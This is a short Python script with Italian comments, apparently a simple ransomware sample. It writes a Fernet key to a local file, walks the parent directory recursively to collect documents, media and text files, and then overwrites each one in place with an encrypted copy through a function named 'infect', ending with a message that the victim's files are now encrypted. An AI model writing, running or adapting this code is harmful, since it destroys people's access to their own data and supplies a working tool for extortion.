import os
import inspect
from cryptography.fernet import Fernet

# Genera la chiave simmetrica con Fernet
key = Fernet.generate_key()

with open ("thekey.key", "wb") as thekey:
    thekey.write(key)
    
    
def search(path):
    files = []
    filelist = os.listdir(path)

    for filename in filelist:
        file_path = os.path.join(path, filename)
        # Controlla se il file è una directory
        if os.path.isdir(file_path):
            # Aggiungi i file della directory alla lista
            files.extend(search(file_path))

        # Controlla se il file è un file cifrato
        else:
            # Ottieni l'estensione del file
            extension = filename.split(".")[-1]

            # Se l'estensione del file è supportata, aggiungi il file alla lista
            if extension in ["xlsx", "mp4", "pdf","jpg", "jpeg","png","mp3","gif","txt","html"]:

                file_path = os.path.join(path, filename)
                # Aggiungi l'intero percorso file alla lista
                files.append(file_path)
                    
    return files

# Funzione per cifrare i file
def infect(files):
    for f in files:
        with open(f, "rb") as file:
            contents = file.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(f, "wb") as file:
            file.write(contents_encrypted)
    print("ora i tuoi file sono cifrati!")

# Funzione per ottenere il percorso della parent directory       
def get_parent_directory(path):
    return os.path.dirname(path)

parent_dir= get_parent_directory(os.getcwd())
files = search(parent_dir)
infect(files)



    
